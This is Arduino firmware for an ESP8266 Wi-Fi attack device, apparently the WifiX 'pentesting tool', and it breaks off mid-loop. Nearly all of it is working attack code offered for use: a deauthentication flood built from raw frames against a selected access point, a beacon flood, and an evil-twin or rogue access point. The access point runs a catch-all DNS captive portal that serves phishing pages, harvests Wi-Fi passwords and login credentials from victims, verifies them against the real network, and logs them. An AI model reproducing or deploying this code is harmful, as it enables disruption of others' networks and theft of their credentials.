#include <Arduino.h>
#include <DNSServer.h>
#include <SimpleCLI.h>
//#include "mac.h"
#include "LittleFS.h"
#include "web.h"
#include "beacon.h"
#include "sniffer.h"
//#include "deauth_detector.h"
//#include "probe_sniffer.h"
#define MAC "C8:C9:A3:0C:5F:3F"
#define MAC2 "C8:C9:A3:6B:36:74"
bool lock = true;
SimpleCLI cli;
Command send_deauth;
Command stop_deauth;
Command reboot;
Command start_deauth_mon;
Command start_probe_mon;

int packet_deauth_counter = 0;
//////***********************File System******************/////
const char* fsName = "LittleFS";

LittleFSConfig fileSystemConfig = LittleFSConfig();
String fileList = "";
File fsUploadFile;              // a File object to temporarily store the received file
File webportal;
File log_captive;
String status_button;
String getContentType(String filename); // convert the file extension to the MIME type
bool handleFileRead(String path);       // send the right file to the client (if it exists)
void handleFileUpload();                // upload a new file to the SPIFFS

String start_button = "Start";

int target_count = 0;
int target_mark = 0;

//////////////////////////////////******************************************************////////////////////////////////////////////////////////////////////////




const uint8_t channels[] = {1, 6, 11}; // used Wi-Fi channels (available: 1-14)
const bool wpa2 = true; // WPA2 networks
const bool appendSpaces = false; // makes all SSIDs 32 characters long to improve performance

char ssids[500];
  
// ==================== //
String wifistr = "";

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}
int ledstatus = 0;
bool hotspot_active = false;
bool deauthing_active = false;
bool pishing_active = false;
bool hidden_target = false;
bool deauth_mon = false;
unsigned long d_mon_ = 0;
int ledState = LOW; 
int ledState2 = LOW; 
unsigned long previousMillis = 0;
const long interval = 1000;
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t rssi;
  uint8_t bssid[6];
  String bssid_str;
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP;
IPAddress dnsip;
DNSServer dnsServer;

_Network _networks[16];
_Network _selectedNetwork;
String ssid_target = "";
String mac_target = "";
void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}


String _correct = "";
String _tryPassword = "";
void handleList(){
  fileList = "";
  Dir dir = fileSystem->openDir("");
  
  Serial.println(F("List of files at root of filesystem:"));
  fileList += "";
  while (dir.next()) {
    fileList += "<form style='text-align: left;margin-left: 5px;' action='/delete' methode='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"' </input> ";
    fileList += dir.fileName();
    long size_ = dir.fileSize();
    fileList +=  String(" (") + size_/1000 + "kb)</form><br>";
    Serial.print("/");
    Serial.println(dir.fileName() + " " + dir.fileSize() + String(" bytes"));
  }
  fileList +="";
  
}
void handleFS(){
  handleList();
  FSInfo fs_info;
  fileSystem->info(fs_info);
  total_spiffs = fs_info.totalBytes/1000;
  used_spiffs = fs_info.usedBytes/1000;
  free_spiffs = total_spiffs - used_spiffs;
  
static const char FS_html[] PROGMEM = R"=====(  <div class='card'><p class='card-title'>-File manager-</p><p Style='text-align: center';><form method='post' enctype='multipart/form-data'><input type='file' name='name'><input class='button' type='submit' value='Upload'></form><br>
                 <table><tr><th>Total :  {total_spiffs} kb</th></tr><br>
                 <tr><th>Used  :  {used_spiffs} kb</th></tr><br>
                 <tr><th>Free :  {free_spiffs} kb</th></tr></table><br>
                 <br></p>
                 <label style='text-align: left;margin-left: 5px;' for='list'>File List : <br> {fileList}</label></div>
                 <div class='card'><p class='card-title'>-Web-</p><p Style='text-align: center';> <form action='/websetting' method='POST'> <label for='path'><a href='/eviltwinprev' target='_blank'>Evil Twin</a></label><input type='text' name='evilpath' value='{eviltwinpath}'><br>
                      <label for='path'><a href='/pishingprev' target='_blank'>Pishing  </a></label><input type='text' name='pishingpath' value='{pishingpath}'><br>
                      <label for='path'><a href='/loadingprev' target='_blank'>Loading  </a></label><input type='text' name='loadingpath' value='{loadingpath}'>
                      <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>)=====";
  String fshtml = FPSTR(FS_html);
  fshtml.replace("{fileList}",fileList);
  fshtml.replace("{total_spiffs}", String(total_spiffs));
  fshtml.replace("{used_spiffs}",String(used_spiffs));
  fshtml.replace("{free_spiffs}",String(free_spiffs));
  fshtml.replace("{eviltwinpath}",String(eviltwinpath));
  fshtml.replace("{pishingpath}",String(pishingpath));
  fshtml.replace("{loadingpath}",String(loadingpath));
  webServer.send(200,"text/html",Header + fshtml + Footer);// + upload + input_data + Footer);
 
    
}
void pishingprev(){
  webportal = LittleFS.open(pishingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}
void eviltwinprev(){
  webportal = LittleFS.open(eviltwinpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}
void loadingprev(){
  webportal = LittleFS.open(loadingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}
void handleFileUpload(){ // upload a new file to the SPIFFS
  HTTPUpload& upload = webServer.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    if(!filename.startsWith("/")) filename = "/"+filename;
    Serial.print("handleFileUpload Name: "); Serial.println(filename);
    fsUploadFile = LittleFS.open(filename, "w");            // Open the file for writing in SPIFFS (create if it doesn't exist)
    filename = String();
  } else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile)
      fsUploadFile.write(upload.buf, upload.currentSize); // Write the received bytes to the file
  } else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile) {                                    // If the file was successfully created
      fsUploadFile.close();                               // Close the file again
      Serial.print("handleFileUpload Size: "); Serial.println(upload.totalSize);
      handleFS();
    } else {
      webServer.send(500, "text/plain", "500: couldn't create file");
    }
  }
  //handleList();
}
void handleDelete(){
  Serial.print("delete file :");
  
  char filename[32];
  String names = String("/") + webServer.arg("filename");
  names.toCharArray(filename,32);
  Serial.println(names);
  LittleFS.remove(filename);
  handleFS();
}
void pathsave(){
  Serial.println();
  Serial.println(String(eviltwinpath) + " " + String(pishingpath)+" " + String(loadingpath));
  webServer.arg("evilpath").toCharArray(eviltwinpath,32);
  webServer.arg("pishingpath").toCharArray(pishingpath,32);
  webServer.arg("loadingpath").toCharArray(loadingpath,32);
  savesetting();
  handleFS();
}
void handleStartAttack(){
  int deauth = webServer.arg("deauth").toInt();
  int evil = webServer.arg("evil").toInt();
  int rogue = webServer.arg("rogue").toInt();
  int beacon = webServer.arg("beacon").toInt();
  int hidden = webServer.arg("hidden").toInt();
  if(start_button=="Start"){
    start_button = "Stop";
    Serial.println("\n");
  Serial.println("Start attacking..");
  Serial.println("deauth:"+String(deauth)+", eviltwin:"+String(evil)+", beacon:"+String(beacon));
  Serial.print("target = ");
    if(beacon==1){
          beacon_active = true;
          enableBeacon(ssid_target);
       }
   if(deauth==1){
            deauthing_active = true;
           Serial.print(mac_target);
     }
   if(evil==1||rogue==1){
     webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('WiFI restarting..');</script>");
    
      if(rogue==1){
        pishing_active = true;
        hotspot_active = true;
        Serial.print("target = "+ String(rogueap) +" ");
        dnsServer.stop();
        int n = WiFi.softAPdisconnect (true);
        Serial.println(String(n));
        WiFi.softAPConfig(dnsip , dnsip , IPAddress(255, 255, 255, 0));
        WiFi.softAP(rogueap);
        dnsServer.start(53, "*", dnsip);
      }
      else{
        hotspot_active = true;
          char ssid[32];
      if(hidden==1){
        String(rogueap).toCharArray(ssid,32);
        hidden_target = true;
      } else {
        ssid_target.toCharArray(ssid,32);
      }
      WiFi.mode(WIFI_AP_STA);
      Serial.print("target = "+ String(ssid) +" ");
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(dnsip , dnsip , IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssid);
      dnsServer.start(53, "*", dnsip);
      }
   } else{
    handleIndex();
   }
  }
  else if(start_button=="Stop"){
    ledstatus = 35;
    start_button = "Start";
    pishing_active = false;
    hotspot_active = false;
    beacon_active = false;
    deauthing_active = false;
    Serial.println("\n");
    Serial.println("Stop attacking..");
    Serial.println("deauth:"+String(deauth)+", eviltwin:"+String(evil)+", beacon:"+String(beacon));
    handleIndex();
  }
   Serial.println("\n \n ");
   //
}
//////////////**************************BEACON SPAM****************************//////////
void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex > sizeof(channels)) channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

// Random MAC generator
void randomMac() {
  for (int i = 0; i < 6; i++){
     macAddr[i] = random(256);
  }
}
void enableBeacon(String target_ssid){
  wifistr = "";
  for(int i=0;i<beacon_size;i++){
    wifistr += target_ssid;
    for(int c=0;c<i;c++){
      wifistr += " ";
    }
    wifistr += "\n";
  }
  Serial.println("Sending beacon packet..");
  Serial.println(wifistr);
  wifistr.toCharArray(ssids,250);
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';

  // for random generator
  randomSeed(os_random());

  // set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  // generate random mac address
  randomMac();
  beacon_active = true;
}

///////////////////////////////////////////////////////////////////////////////////////////
void setup() {

  Serial.begin(115200);
  initFS();
  loadsetting();
  apIP.fromString(ip);
  dnsip.fromString(dns);
  //wifi_promiscuous_enable(1);
  wifi_set_channel(chnl);
  Serial.println(WiFi.softAP(ssid, password,chnl,false) ? "Ready" : "Failed!");
  WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);
  pinMode(0,INPUT_PULLUP);
  if(!WiFi.softAP(ssid, password,chnl,false)){
    Serial.println("Wifi Accesst Point failed");
    delay(2000);
    Serial.println("Configure setting");
    wifi_set_opmode(STATIONAP_MODE);
    WiFi.softAP("WiFiX","12345678");
    IPAddress myIP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(myIP);
  }
  
  
  pinMode(2,OUTPUT);
  pinMode(16,OUTPUT);
  pinMode(4,OUTPUT);
  pinMode(0,INPUT_PULLUP);
  digitalWrite(2,HIGH);
  webServer.on("/",HTTP_GET, handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/style.css",handleStyle);
  webServer.on("/scan",HTTP_GET,handleScan);
  webServer.on("/start",HTTP_GET,handleStartAttack);
  webServer.on("/target",HTTP_POST,handleTarget);
  webServer.on("/delete",handleDelete);
  webServer.on("/websetting",HTTP_POST,pathsave);
  webServer.on("/setting",HTTP_GET,handleSetting);
  webServer.on("/networksetting",HTTP_POST,networksetting);
  webServer.on("/attacksetting",HTTP_POST,attacksetting);
  webServer.on("/eviltwinprev",HTTP_GET,eviltwinprev);
  webServer.on("/pishingprev",HTTP_GET,pishingprev);
  webServer.on("/loadingprev",HTTP_GET,loadingprev);
  webServer.on("/sniffer",HTTP_GET,handleSniffer);
  webServer.on("/log",HTTP_GET,handleLog);
  webServer.on("/deauthmon",HTTP_GET,Dstartmon);
  webServer.on("/probemon",HTTP_GET,Pstartmon);
  webServer.on("/filemanager",HTTP_GET,handleFS);
 // server.on("/filemanager", HTTP_GET, []() {                 // if the client requests the upload page
    //if (!handleFileRead("/upload.html"))                // send it if it exists
 //     server.send(404, "text/plain", "404: Not Found"); // otherwise, respond with a 404 (Not Found) error
 // });

  webServer.on("/filemanager", HTTP_POST,                       // if the client posts to the upload page
    [](){ webServer.send(200); },                          // Send status 200 (OK) to tell the client we are ready to receive
    handleFileUpload                                    // Receive and save the file
  );
  webServer.on("/ssid_info",ssid_info);
  webServer.on("/index.js", HTTP_GET, []() {
                handleJS();
            });
  webServer.onNotFound(handleIndex);
  webServer.begin();
  send_deauth = cli.addCmd("send_deauth");
  stop_deauth = cli.addCmd("stop_deauth");
  reboot = cli.addCmd("reboot");
  start_deauth_mon = cli.addCmd("start_deauth_mon");
  handleList();
  //Serial.println("\n \n \n Ini adalah versi gratis dari firmware pentesting tool WifiX v1.3 dari youtube ASP-29 Tech \n Penggunaan hanya dibatasi sampai 15 menit saja \n diperuntukan bagi kalian yang mau mencoba dulu kestabilan serta fitur apa saja yang ada di firmware ini \n terima kasih..,harap dimaklumi,yg buat firmware ini juga butuh fulus buat makan wkwkwk");
  
 
  
}
void handleJS(){
  sendProgmem(script, sizeof(script), "text/plain");
}
void handleLog(){
  log_captive = LittleFS.open("/log.txt","r");
  String loG = "<div class='card'><p class='card-title'>-Log-</p><p Style='text-align: center';>" +log_captive.readString()+"</p></div>";
  webServer.send(200,"text/html",Header + loG + Footer);
  log_captive.close();
}
void handleSetting(){
  
  static const char setting[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-Network-</p><p Style='text-align: center';>
                        <form action='/networksetting' method='POST'> <label for='ssid'>SSID  </label><input type='text' name='ssid' value='{ssid}'><br>
                        <label for='pass'>Pass </label><input type='text' minlength='8' name='password' value='{password}'><br>
                        <label for='pass'>Chnl </label><input type='number' name='channel' value='{chnl}'><br>
                        <label for='ip'>IP DNS  </label><input type='text' name='dns' value='{dns}'></input><br>
                        <label for='ip'>Ip addr  </label><input type='text' name='ip' value='{ip}'></input><br>
                        <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>
                        <div class='card'><p class='card-title'>-Attack-</p><p Style='text-align: center';>
                        <form action='/attacksetting' method='POST'> <label for='rogueap'>RogueAP</label><input type='text' name='rogueap' value='{rogueap}'><br>
                        <label for='enable_loading'>Loading page </label><input type='number' name='loading_enable' value='{loading_enable}'><br>
                        <label for='beacon_size'> Beacon size </label><input type='number' name='beacon_size' value='{beacon_size}'><br>
                        <label for='deauth_speed'> Deauth /s </label><input type='number' name='deauth_speed' value='{deauth_speed}'><br>
                        <input  style='width: 80px;height: 45px;'type ='submit' value ='Save'></form><br></p></div>)=====";
  String inputNetwork = FPSTR(setting);
  inputNetwork.replace("{ssid}",String(ssid));
  inputNetwork.replace("{password}",String(password));
  inputNetwork.replace("{chnl}",String(chnl));
  inputNetwork.replace("{dns}",String(dns));
  inputNetwork.replace("{ip}",String(ip));
  inputNetwork.replace("{rogueap}",String(rogueap));
  inputNetwork.replace("{loading_enable}",String(loading_enable));
  inputNetwork.replace("{beacon_size}",String(beacon_size));
  inputNetwork.replace("{deauth_speed}",String(deauth_speed));
  
  webServer.send(200,"text/html", Header + inputNetwork +  Footer);
  
}
void handleSniffer(){
  static const char sniferhtml[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-Explanation-</p><p Style='text-align: center';>
                    What is this??<br>
                    this is a function for monitor mode,in this mode wifi will<br>
                    switches into station mode and starts sniffing packets around within its range<br>
                    - probe monitor, a function to track probe request packets<br>
                    and display some data such as hidden ssid, device mac address,<br>
                    RSSI, within range<br>
                    - deauth monitor, functions to track packets in deauther attacks such as<br> 
                    deauthentication or dissassociaten frame, which can display the distance<br>
                    of the attacker, the target mac and how many packets were sent<br>
                    D_mon is 'Deauth monitor' and P_mon is 'probe request monitor'
                    <br></p></div>
                    <div class='card'><p class='card-title'>-Start-</p><p Style='text-align: center';>
                    <a href='/deauthmon'><button class='button-on'>D_mon</button></a>&nbsp;
                    <a href='/probemon'><button class='button-on'>P_mon</button></a>
                    <br></p></div>)=====";
  String html = FPSTR(sniferhtml);                    
  webServer.send(200,"text/html",Header + sniferhtml +Footer);                
}
void Dstartmon(){
  deauth_mon = true;
  webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Starting deauth monitor');</script>");
  delay(3000);
  setup_d_detector();
}
void Pstartmon(){
  webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Starting probe request monitor');</script>");
  delay(3000);
  setupprobe();
}
void attacksetting(){
  webServer.arg("rogueap").toCharArray(rogueap,32);
  loading_enable = webServer.arg("loading_enable").toInt();
  beacon_size = webServer.arg("beacon_size").toInt();
  deauth_speed = webServer.arg("deauth_speed").toInt();
  webServer.arg("ssid1").toCharArray(ssid1,32);
  webServer.arg("ssid2").toCharArray(ssid2,32);
  webServer.arg("ssid3").toCharArray(ssid3,32);
  webServer.arg("ssid4").toCharArray(ssid4,32);
  savesetting();
  handleSetting();
}

void networksetting(){
  webServer.arg("ssid").toCharArray(ssid,32);
  webServer.arg("password").toCharArray(password,64);
  webServer.arg("dns").toCharArray(dns,32);
  webServer.arg("ip").toCharArray(ip,32);
  webServer.arg("ip").toCharArray(ip,32);
  chnl = webServer.arg("channel").toInt();
  savesetting();
  handleSetting();
}
void ssid_info(){
  if(hidden_target==true){
    webServer.send(200,"text/plane",String(rogueap));
  }else {
    webServer.send(200,"text/plane",_selectedNetwork.ssid);
  }
  
}
void performScan() {
  int n = WiFi.scanNetworks(false,true);
  target_count = n;
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      if(WiFi.isHidden(i)){
        network.ssid = "*HIDDEN*";
      }else {
        network.ssid = WiFi.SSID(i);
      }
      
      network.bssid_str = WiFi.BSSIDstr(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.rssi = WiFi.RSSI(i);
      network.ch = WiFi.channel(i);
      _networks[i] = network;
     Serial.print(i);
     Serial.print(" ");
     Serial.print(network.ssid);
     Serial.print(" ");
     Serial.print(network.bssid_str);
     Serial.print(" ");
     Serial.println(network.rssi);
    }
  }
}


void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Failed..,check the pasword again');</script>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Update Berhasil,Silahkan Tunggu...</h2></body> </html>");
    webportal.close();
    ledstatus = 35;
    hotspot_active = false;
    deauthing_active = false;
    target_mark = target_count;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(apIP,apIP , IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid, password);
    //dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    
    _correct = "Successfully got password for : " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    log_captive = LittleFS.open("/log.txt","a");
    log_captive.print("==> Attack mode : evil twin, web portal : "+String(eviltwinpath)+", target : "+ _selectedNetwork.ssid + ", password : "+_tryPassword +"<br>");
    log_captive.close();
    
  }
}
String scanned = "";
void handleStyle(){
  String sty = FPSTR(style);
  webServer.send(200,"text/css",sty);
}

void handleScan(){
  performScan();
  handleIndex();
}
void handleTarget(){
  ssid_target = webServer.arg("ssid");
  mac_target = webServer.arg("bssid");
  target_count = webServer.arg("mark").toInt();
  _selectedNetwork.ch = webServer.arg("ch").toInt();
  Serial.print("target = "+ ssid_target +" ");
  Serial.print(mac_target);
  Serial.println(" "+ String(_selectedNetwork.ch)); 
  for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == mac_target ) {
        _selectedNetwork = _networks[i];
      }
    }
  
  handleIndex();
}
void handleIndex() {
  String deauth_s;
  String beacon_s;
 
  static const char attack_html[] PROGMEM = R"=====( 
                   <div class='card'><p class='card-title'>-Setup-</p><p Style='text-align: center';>
                   <form style='text-align: left;margin-left: 5px;' methode='post' action='/start' >
                   <input type='checkbox' value='1' name='deauth'><label for='deauth' >Deauth {deauth_s}</label><br>
                   <input type='checkbox' value='1' name='evil' ><label for='evil' >Evil twin</label><br>
                   <input type='checkbox' value='1' name='beacon' ><label for='beacon' >Beacon flood {beacon_s}</label><br>
                   <input type='checkbox' value='1' name='hidden' ><label for='hidden' >Target hidden</label><br>
                   <input type='checkbox' value='1' name='rogue' ><label for='rogue' >Rogue wifi</label><br><br>
                   <input style='width: 100px;height: 48px;' type='submit' value='{start_button}'></input></form>
                   <a href='/scan'><button class='button-on'>Scan</button></a>
                   </p></div>
                   <div class='card'><p class='card-title'>-Target-</p><p Style='text-align: center';>{scanned})=====";
 String _tempHTML = FPSTR(attack_html);
 _tempHTML.replace("{start_button}",start_button);
 if(deauthing_active == true){
    _tempHTML.replace("{deauth_s}", "*");
  }else {
    _tempHTML.replace("{deauth_s}", "");
  }
  if(beacon_active == true){
    _tempHTML.replace("{beacon_s}", "*");
  }else {
    _tempHTML.replace("{beacon_s}", "");
  }
  if (hotspot_active == false) {
    String _html = "";
    
    for (int i = 0; i < 16; ++i) {
      String pass;
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<form  style='text-align: left;margin-left: 5px;'method='post' action='/target'><input name='ssid' type='hidden' value='" + _networks[i].ssid + "'></input><input name='ch' type='hidden' value='"+_networks[i].ch+"'></input><input name='bssid' type='hidden' value='" + bytesToStr(_networks[i].bssid, 6) + "'></input><input name='mark' type='hidden' value='" + String(i) + "'></input>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<input type='submit' style='background-color: #90ee90;' value='selected'></input>";
        
      } else {
        _html += "<input type='submit' value='select'></input";
      }
      if(i == target_mark){
        if(_tryPassword==""){
        pass = "";
      }else {
        pass = "[" + _tryPassword + "]";
      }
      }
      _html += "<label for='target'>  " + _networks[i].ssid +  " " + _networks[i].rssi + " " + pass + "</label></form><br>";
     
    }
    
    
    scanned = _html;
    _tempHTML.replace("{scanned}",scanned);
    webServer.send(200, "text/html", Header + _tempHTML + "</p></div>" + Footer);

  } else {

   
     if (webServer.hasArg("password")) {
      if(hidden_target == true){
        ssid_target = String(rogueap);
      }
      Serial.println("victim entered " + ssid_target);
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(ssid_target.c_str(), webServer.arg("password").c_str());
     // webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
      webServer.send(200,"text/html","<!DOCTYPE html><html><style>#myProgress {width: 100%;background-color: #ddd;}#myBar { width: 1%; height: 30px;background-color: #04AA6D;}</style><body><div id='myProgress'><div id='myBar'></div></div><br><script>setTimeout(function(){window.location.href = '/result';}, 15000);var i = 0;if (i == 0) { i = 1; var elem = document.getElementById('myBar');var width = 1;var id = setInterval(frame, 150);function frame() { if (width >= 100) {clearInterval(id);i = 0; } else { width++; elem.style.width = width + '%';}}}</script></body></html>");

      
      ledstatus = 40;
    } 
    
   
    if (webServer.hasArg("user")){
      Serial.print("victim entered user = " + webServer.arg("user"));
      log_captive = LittleFS.open("/log.txt","a");
      log_captive.print("==> Attack mode : rogue wifi, web portal : "+String(pishingpath)+", user : "+ webServer.arg("user"));
      
    }
    if (webServer.hasArg("pass")){
      Serial.println(" and pass = " + webServer.arg("pass"));
      log_captive.print(", password : "+webServer.arg("pass") +"<br>");
      log_captive.close();
      webServer.send(200,"text/html","<!DOCTYPE html><html><style>#myProgress {width: 100%;background-color: #ddd;}#myBar { width: 1%; height: 30px;background-color: #04AA6D;}</style><body><div id='myProgress'><div id='myBar'></div></div><br><script>setTimeout(function(){window.location.href = '/result';}, 15000);var i = 0;if (i == 0) { i = 1; var elem = document.getElementById('myBar');var width = 1;var id = setInterval(frame, 150);function frame() { if (width >= 100) {clearInterval(id);i = 0; } else { width++; elem.style.width = width + '%';}}}</script></body></html>");

      delay(3000);
      ESP.restart();
      ledstatus = 40;
    }
    
   
    
    else {
     if(loading_enable==0){
      if(pishing_active== true){
        webportal = LittleFS.open(pishingpath,"r");
      } else {
        webportal = LittleFS.open(eviltwinpath,"r");
         
      } 
      
     }
     else if(loading_enable==1){
        webportal = LittleFS.open(loadingpath,"r");
     }
       
      webServer.streamFile(webportal,"text/html");
      ledstatus = 100;
    }
  }

}

void handleAdmin() {
 
  String _html = scanned;


  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<form method='post' action='/target><label for='target'>" + _networks[i].ssid + " "/* + bytesToStr(_networks[i].bssid, 6) + " "*/ + _networks[i].rssi +  /*+ String(_networks[i].ch) +*/ "</label><input name='bssid' type='hidden' value='" +  bytesToStr(_networks[i].bssid, 6) + "'></input>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<input type='submit' style='background-color: #90ee90;' value='Selected'></input></form>";
    } else {
      _html += "<input type='submit' value='select'></input></form>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  scanned = _html;
  //webServer.send(200, "text/html", Header + _tempHTML + scanned+"<br></p></div>" + Footer);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long Now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
//uint8_t wifi_channel = 1;

void loop() {
  if(digitalRead(0)==LOW){
    delay(1000);
    if(digitalRead(0)==LOW){
      delay(1000);
      if(digitalRead(0)==LOW){
        delay(2000);
        if(digitalRead(0)==LOW){
          delay(1000);
          if(digitalRead(0)==LOW){
            LittleFS.remove("/setting.txt");
            Serial.println("reset setting...");
            delay(2000);
            Serial.println("Rebooting...");
            LittleFS.format();
            ESP.restart();
          }
        }
      }
    }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
   if (Serial.available()) {
        // Read out string from the serial monitor
        String input = Serial.readStringUntil('\n');

        // Echo the user input
        Serial.print("# ");
        Serial.println(input);

        // Parse the user input into the CLI
        cli.parse(input);
    }
   if (cli.available()) {
        // Get command out of queue
        Command cmd = cli.getCmd();

        // React on our ping command
        if (cmd == send_deauth) {
            Serial.println("Starting deauth target");
            deauthing_active = true;
        }
        else if(cmd == stop_deauth) {
            Serial.println("Stop");
            deauthing_active = false;
            ledstatus = 35;
        }
        else if(cmd == reboot) {
            Serial.println("Restarting WifiX Device....");
            Serial.println("reboot in 5 second");
            delay(1000);
            Serial.println("reboot in 4 second");
            delay(1000);
            Serial.println("reboot in 3 second");
            delay(1000);
            Serial.println("reboot in 2 second");
            delay(1000);
            Serial.println("reboot in 1 second");
            delay(1000);
            ESP.restart();
        }
       else if(cmd == start_deauth_mon){
        Dstartmon();
        Serial.println("Starting deauth monitor");
       }
    }
 
 unsigned long currentMillis = millis();
  if(ledstatus == 100){
    digitalWrite(2,ledState);
  }
  else if(ledstatus == 35){
    digitalWrite(2,LOW);
  }
  else{
    digitalWrite(2,LOW);
  }
   
  if (currentMillis - previousMillis >= 100) {
    // save the last time you blinked the LED
    previousMillis = currentMillis;

    // if the LED is off turn it on and vice-versa:
    if (ledState == LOW) {
      ledState = HIGH;
    } else {
      ledState = LOW;
    }
   digitalWrite(16,ledState);
    // set the LED with the ledState of the variable:
    
  }
  if(deauth_mon == true && millis() - d_mon_ >= 500){
    d_mon_ = millis();
    packet_deauth_counter = packet_rate;
    if(packet_deauth_counter>=1)ledstatus = 100;
    else ledstatus = 35;
    packet_rate=0;
   // if(packet_rate<=0)packet_rate=0;
  }
  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
   ledstatus = 100;
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    for(int i=0;i<=5;i++){
      bytesToStr(deauthPacket, 26);
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    bytesToStr(deauthPacket, 26);
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    }
    //Serial.println();
    deauthPacket[0] = 0xC0;
   // Serial.println();
   // Serial.println();
    deauthPacket[0] = 0xA0;
   Serial.println("Sending deauth packet");

    deauth_now = millis();
  }

  currentTime = millis();

  // send out SSIDs
  if (beacon_active == true && currentTime - attackTime > 100) {
    attackTime = currentTime;
   ledstatus = 100;
    // temp variables
    int i = 0;
    int j = 0;
    int ssidNum = 1;
    char tmp;
    int ssidsLen = strlen_P(ssids);
    bool sent = false;

    // Go to next channel
   nextChannel();

    while (i < ssidsLen) {
      // Get the next SSID
      j = 0;
      do {
